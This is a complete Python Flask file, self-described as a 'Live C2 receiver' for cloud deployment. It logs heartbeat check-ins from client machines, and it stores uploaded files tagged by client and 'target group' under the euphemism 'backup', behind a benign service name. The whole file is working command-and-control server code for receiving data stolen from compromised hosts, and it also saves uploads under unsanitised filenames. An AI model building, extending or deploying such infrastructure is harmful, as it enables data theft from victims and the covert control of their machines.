"""Live C2 receiver — deploy to Render, Railway, Fly.io, or any Docker host."""

from __future__ import annotations

import json
import os
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request

app = Flask(__name__)

UPLOAD_DIR = Path(os.environ.get("UPLOAD_DIR", "received_uploads"))
UPLOAD_DIR.mkdir(exist_ok=True)


@app.get("/")
def health():
    return {"status": "ok", "service": "sys-agent-receiver"}, 200


@app.post("/v1/heartbeat")
def heartbeat():
    payload = request.get_json(silent=True) or {}
    client_id = request.headers.get("X-Client-ID", "unknown")
    stamp = datetime.now(timezone.utc).isoformat()

    log_line = {
        "type": "heartbeat",
        "time": stamp,
        "client_id": client_id,
        "payload": payload,
    }
    _append_log(log_line)
    print(json.dumps(log_line))

    return "", 200


@app.post("/v1/backup")
def backup():
    client_id = request.headers.get("X-Client-ID", "unknown")
    target_group = request.headers.get("X-Target-Group", "unknown")
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    upload = request.files.get("file")

    if upload:
        dest = UPLOAD_DIR / f"{client_id}_{stamp}_{upload.filename}"
        upload.save(dest)
        size = dest.stat().st_size
    else:
        dest = None
        size = 0

    log_line = {
        "type": "backup",
        "time": datetime.now(timezone.utc).isoformat(),
        "client_id": client_id,
        "target_group": target_group,
        "saved_to": str(dest) if dest else None,
        "bytes": size,
    }
    _append_log(log_line)
    print(json.dumps(log_line))

    return "", 200


def _append_log(entry: dict) -> None:
    log_path = UPLOAD_DIR / "events.jsonl"
    with log_path.open("a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8080"))
    app.run(host="0.0.0.0", port=port)
